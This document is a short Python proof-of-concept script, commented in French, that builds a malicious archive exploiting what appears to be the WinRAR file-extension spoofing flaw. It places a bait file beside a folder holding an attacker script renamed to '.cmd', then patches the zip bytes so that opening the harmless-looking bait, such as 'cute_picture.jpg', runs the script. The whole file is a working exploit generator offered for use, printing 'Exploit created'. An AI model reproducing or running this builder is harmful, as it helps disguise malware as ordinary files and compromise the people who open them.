import shutil
import os, sys
from os.path import join

# Nom du répertoire modèle (template)
TEMPLATE_NAME = "TEMPLATE"

# Vérifie si au moins trois arguments de ligne de commande sont fournis
if len(sys.argv) > 3:
    BAIT_FILENAME = os.path.basename(sys.argv[1])  # Nom du fichier appât
    SCRIPT_FILENAME = os.path.basename(sys.argv[2])  # Nom du fichier script
    OUTPUT_FILENAME = os.path.basename(sys.argv[3])  # Nom du fichier de sortie
else:
    # Si les arguments sont insuffisants, affiche un message d'utilisation et quitte le script
    print("Usage: python poc.py <BAIT_FILENAME> <SCRIPT_FILENAME> <OUTPUT_FILENAME>")
    print("Example: python poc.py cute_picture.jpg exploit.bat output.rar")
    sys.exit()

# Obtient l'extension du fichier appât (en format binaire)
BAIT_EXT = b"." + BAIT_FILENAME.split(".")[-1].encode("utf-8")

# Vérifie si le répertoire modèle existe et le supprime s'il existe
if os.path.exists(TEMPLATE_NAME):
    shutil.rmtree(TEMPLATE_NAME)

# Crée le répertoire modèle
os.mkdir(TEMPLATE_NAME)

# Crée un sous-répertoire dans le répertoire modèle
d = join(TEMPLATE_NAME, BAIT_FILENAME + "A")
if not os.path.exists(d):
    os.mkdir(d)

# Copie le contenu du fichier script dans le sous-répertoire avec une extension différente
shutil.copyfile(join(SCRIPT_FILENAME), join(d, BAIT_FILENAME + "A.cmd"))

# Copie le contenu du fichier appât dans le répertoire modèle avec une extension différente
shutil.copyfile(join(BAIT_FILENAME), join(TEMPLATE_NAME, BAIT_FILENAME + "B"))

# Crée une archive ZIP à partir du répertoire modèle
shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME)

# Ouvre l'archive ZIP pour effectuer des remplacements de texte
with open(TEMPLATE_NAME + ".zip", "rb") as f:
    content = f.read()
    content = content.replace(BAIT_EXT + b"A", BAIT_EXT + b" ")  # Remplace A par un espace
    content = content.replace(BAIT_EXT + b"B", BAIT_EXT + b" ")  # Remplace B par un espace

# Supprime l'archive ZIP et le répertoire modèle s'ils existent
os.remove(TEMPLATE_NAME + ".zip")
if os.path.exists(TEMPLATE_NAME):
    shutil.rmtree(TEMPLATE_NAME)

# Écrit le contenu modifié dans le fichier de sortie
with open(OUTPUT_FILENAME, "wb") as f:
    f.write(content)

# Affiche un message pour indiquer que l'exploit a été créé
print("Exploit created: " + OUTPUT_FILENAME)
